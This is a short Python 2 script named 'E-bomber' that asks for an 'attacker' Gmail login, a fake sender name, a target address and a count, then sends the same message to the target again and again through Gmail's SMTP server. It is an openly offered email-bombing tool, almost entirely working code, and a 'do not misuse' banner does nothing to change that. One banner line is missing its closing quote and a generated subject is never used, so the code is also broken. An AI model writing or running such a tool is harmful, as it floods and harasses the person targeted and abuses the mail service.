#!/usr/bin/python
#E-bomber



import os
import smtplib
import getpass
import sys
import time

print '                                                                    '
print '                                                                    '
print '            ####################################################       '
print '            #                                                  #       '
print '            #                   Email Bomb                     #       '
print '            #                                                  #       '
print '            #                create By Devanshu                #       '
print '            #                                                  #       '
print '            #               || JUST ROCK IT ||                 #       '
print '            #                                                  #       '
print '            #            !!!!DO NOT MISUSE THIS!!!!            #       '
print '            #                                                  #       '
print '            #             ____NO COPYRIGHTS____                #       '
print '            #                                                  #       '
print '            # FOLLOW ME ON INSTAGRAM- @ethical_hacking.courses #
print '            ####################################################       '

print '                                                                            '


print '                                           '

print '    '
email = raw_input('Attacker Gmail Address : ')
print '             '
user = raw_input('Anonymous name : ')
print '      '
passwd = getpass.getpass('Password: ')

print '   '

to = raw_input('\nTo: ')


print '    '

body = raw_input('Message: ')

print '    '

total = input('Number of send: ')

smtp_server = 'smtp.gmail.com'
port = 587


print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    server.starttls()
    server.login(email,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
        server.sendmail(email,to,msg)
        print "\rE-mails sent: %i" % i
        time.sleep(1)
        sys.stdout.flush()
    server.quit()
    print '\n Done !!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] The username or password you entered is incorrect.'
print ' THANKS TO USE THIS '
print ' FOLLOW ON INSTAGRAM- @ethical_hacking.courses '
sys.exit()
